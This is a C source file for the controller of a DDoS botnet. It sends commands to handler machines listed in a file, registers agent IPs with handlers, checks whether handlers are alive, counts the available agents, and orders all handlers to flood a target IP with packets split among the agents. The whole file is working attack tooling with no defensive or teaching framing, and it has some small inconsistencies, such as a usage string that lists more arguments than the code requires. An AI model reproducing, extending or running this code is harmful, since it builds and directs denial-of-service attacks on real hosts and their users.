#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "net_sockets.h"
#include "ddos.h"

#define ERROR -1
#define DEFAULT_PKTS_NUMBER 100
#define VALIDATED_HANDLERS_FILE_NAME "valid_handlers.txt"
#define TMP_FILE "tmp.txt"

typedef enum
{
    CMD_ADD_AGENT = 0,
    CMD_INTERROGATE_HANDLERS = 1,
    CMD_VALIDATE_AGENTS = 2,
    CMD_COUNT_AGENTS = 3,
    CMD_ATTACK = 4,

    CMD_NUMBER = 5, /* Number of availible commands */
}cmd_t;

typedef struct
{
    char *cmd;
    unsigned int args;
    char *usage;
    char *description;
}cmd_data_t;


/* The list of availible commands */
static cmd_data_t commands[CMD_NUMBER] = 
{
    [CMD_ADD_AGENT] = {
        .cmd = "add",
        .args = 2,
        .usage = "add <handler_ip> <agent_ip>",
        .description = "Add Agent to Handler"
    },

    [CMD_INTERROGATE_HANDLERS] = {
        .cmd = "intr",
        .args = 1,
        .usage = "intr <handlers_file>",
        .description = "Interrogate handlers",
    },

    [CMD_VALIDATE_AGENTS] = {
        .cmd = "validate",
        .args = 1,
        .usage = "validate <handlers_file>",
        .description = "Validate Agents",
    },

    [CMD_COUNT_AGENTS] = {
        .cmd = "count",
        .args = 1,
        .usage = "count <handlers_file>",
        .description = "Print the number of availible agents",
    },

    [CMD_ATTACK] = {
        .cmd = "attack",
        .args = 2,
        .usage = "attack <handlers_file> <target_ip> <packets>",
        .description = "Attack the target",
    },
};

/* Print the usage of the programm 
 *      @cmd - print usage for specific command, CMD_NUMBER - print all */
static int print_usage(cmd_t cmd)
{
    int print_all = (cmd == CMD_NUMBER) ? 1 : 0;

    if (print_all)
    {
        fprintf(stderr, "Availible commads:\n");
        cmd = 0;
    }
    for (; cmd < CMD_NUMBER; cmd++)
    {
        fprintf(stderr, "%s\n\tUsage: %s\n", commands[cmd].description,
                commands[cmd].usage);
        if (!print_all)
            break;
    }
    return 1;
}

static cmd_t parse_args(int argc, char *argv[])
{
    cmd_t i;

    if (argc < 2)
    {
        i = CMD_NUMBER;
        goto Exit;
    }

    for (i = 0; i < CMD_NUMBER; i++)
    {
        if (!strcmp(argv[1], commands[i].cmd) &&
                (strlen(argv[1]) == strlen(commands[i].cmd)))
        {
            /* Command was found, checking parametres */
            if ((argc - 2) < commands[i].args)
            {
                /* The number of passed arguments is invalid */
                print_usage(i);
                i = ERROR;
                break;
            }
            break;
        }
    }

Exit:
    if (i == CMD_NUMBER)
    {
        print_usage(i);
        i = ERROR;
    }

    return i;
}

static int interrograte_hanler(int sock, char* handler_ip, void *data)
{
    int version, rv;
    ddos_request_t req = {};
    ddos_responce_t resp = {};

    req.cmd = htons(DDOS_CMD_INTERROGATE_HANDLER);

    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);
    if (rv < 0)
	return ERROR;

    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
    if (rv < 0 || !(version = ntohs(resp.data)))
    {
        fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
	return 1;

    }
    fprintf(stdout, "Hanlder %s is active, version %d.\n", handler_ip, version);

    return 0;
}

typedef int (*action_cb_t)(int sock, char *hanler_ip, void *data);
static int for_each_handler(int sock, char *handlers_file, action_cb_t action_cb,
        void *action_data)
{
    FILE *fp, *valid_fp = NULL;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    char ip[INET_ADDRSTRLEN] = {};
    int is_same_file = 0;

    if (!strcmp(handlers_file, VALIDATED_HANDLERS_FILE_NAME))
	is_same_file = 1;

    fp = fopen(handlers_file, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Could not open hanlers file \"%s\".\n", handlers_file);
        goto Error;
    }

    valid_fp = fopen(is_same_file ? TMP_FILE : VALIDATED_HANDLERS_FILE_NAME, "w");
    if (valid_fp == NULL)
    {
        fprintf(stderr, "Could not create valid_hanlers file \"%s\".\n",
		VALIDATED_HANDLERS_FILE_NAME);
        goto Error;
    }

    while ((read = getline(&line, &len, fp)) != ERROR)
    {
        strncpy(ip, line, (read - (strchr(line, '\n') ?  1 : 0)));
        if (!action_cb(sock, ip, action_data))
	    fprintf(valid_fp, "%s\n", ip);
	memset(ip, 0, INET_ADDRSTRLEN);
    }

    if (is_same_file)
    {
	remove(VALIDATED_HANDLERS_FILE_NAME);
	rename(TMP_FILE, VALIDATED_HANDLERS_FILE_NAME);
    }

    fclose(fp);
    fclose(valid_fp);


    return 0;

Error:
    if (fp)
        fclose(fp);
    if (valid_fp)
        fclose(valid_fp);
    free(line);

    return ERROR;
}
typedef struct 
{
    int need_add;
    int need_rm;
    char *ip;
} update_handler_list_t;

static int is_handler_needed(int sock, char *ip, void *data)
{
    update_handler_list_t *upd = data;

    if (!strcmp(upd->ip, ip) && (strlen(upd->ip) == strlen(ip)))
    {
	if (upd->need_add)
	    upd->need_add = 0;
	else if (upd->need_rm)
	    return 1;
    }

    return 0;
}

static int ddns_add_agent(int sock, char *handler_ip, char *agent_ip)
{
    int handler_version, rv;
    ddos_request_t req;
    ddos_responce_t resp;
    update_handler_list_t upd = {};
    FILE *fp;

    req.cmd = htons(DDOS_CMD_ADD_AGENT);
    strcpy(req.ip, agent_ip);

    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);
    if (rv < 0)
	return ERROR;

    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
    upd.ip = handler_ip;
    if (rv < 0 || !(handler_version = ntohs(resp.data)))
    {
	fprintf(stderr, "Handler %s is unavailible\n", handler_ip);
	upd.need_rm = 1;
    }
    else
    {
	fprintf(stdout, "Handler %s is availible. Version %d\n", handler_ip, handler_version);
	upd.need_add = 1;
    }
    for_each_handler(sock, VALIDATED_HANDLERS_FILE_NAME, is_handler_needed, &upd);
    if (!upd.need_add)
	return upd.need_rm;

    fp = fopen(VALIDATED_HANDLERS_FILE_NAME, "a");
    if (fp == NULL)
    {
        fprintf(stderr, "Could not open agents file \"%s\".\n",
		VALIDATED_HANDLERS_FILE_NAME);
        return ERROR;
    }
    fprintf(fp, "%s\n", handler_ip);

    if (ntohs(resp.status) == DDOS_OK)
        fprintf(stderr, "Agent %s was added\n", agent_ip);
    else
        fprintf(stderr, "Agent %s wasn't added %d\n", agent_ip, ntohs(resp.status));

    return 0;
}

static int validate_agents(int sock, char *handler_ip, void *data)
{
    int agents_number, rv;
    ddos_request_t req;
    ddos_responce_t resp;

    req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);
    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);
    if (rv < 0)
	return ERROR;

    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
    if (rv < 0)
    {
	if (!data)
	    fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
	return 1;
    }

    else
    {
        agents_number = ntohs(resp.data);
	if (!data)
	{
	    fprintf(stdout, "Hanlder %s is active, agents number: %d.\n",
		    handler_ip, agents_number);
	}
	else
	    *(int *)data = agents_number;
    }

    return 0;
}

static int count_agents(int sock, char *handler_ip, void *data)
{
    int *agents_cnt = data;
    int agents_per_handler;

    if (!validate_agents(sock, handler_ip, &agents_per_handler))
	*agents_cnt += agents_per_handler;

    return 0;
}

static int attack(int sock, char *handler_ip, void *data)
{
    attack_data_t *attack_data = data;
    ddos_request_t req;
    ddos_responce_t resp;
    int rv;

    req.cmd = htons(DDOS_CMD_ATTACK);
    req.pkts = htons(attack_data->pkts);
    strcpy(req.ip, attack_data->target_ip);

    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);

    if (rv < 0)
	return ERROR;

    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
    if (rv < 0 || (ntohs(resp.status) != DDOS_OK))
	return 1;

    return 0;
}

int main(int argc, char *argv[])
{
    cmd_t cmd;
    int rv = 0, sock, agents = 0, pkts;
    attack_data_t attack_data;

    cmd = parse_args(argc, argv);
    if (cmd == ERROR)
        return 1;

    sock = create_socket(DDOS_CTRL_CLT_PORT, 10000); 
    if (sock == ERROR)
        return 1;

    switch (cmd)
    {
        case CMD_ADD_AGENT:
            rv = ddns_add_agent(sock, argv[2], argv[3]);
            break;
        case CMD_INTERROGATE_HANDLERS:
            rv = for_each_handler(sock, argv[2], interrograte_hanler, NULL);
            break;
        case CMD_VALIDATE_AGENTS:
            rv = for_each_handler(sock, argv[2], validate_agents, NULL);
            break;
        case CMD_COUNT_AGENTS:
            rv = for_each_handler(sock, argv[2], count_agents, &agents);
	    fprintf(stdout, "Avalible agents: %d\n", agents);
            break;
        case CMD_ATTACK:
            pkts = (argc > 4) ? atoi(argv[4]) : DEFAULT_PKTS_NUMBER;
            rv = for_each_handler(sock, argv[2], count_agents, &agents);
	    if (!agents)
	    {
		fprintf(stdout, "No avalible agents!\n");
		goto Exit;
	    }

            attack_data.pkts = (int)(pkts / agents);
            attack_data.target_ip = argv[3];
            rv = for_each_handler(sock, argv[2], attack, &attack_data);
            break;
        default:
            break;
    }

Exit:
    destroy_socket(sock);

    return (rv < 0) ? 1 : 0;
}
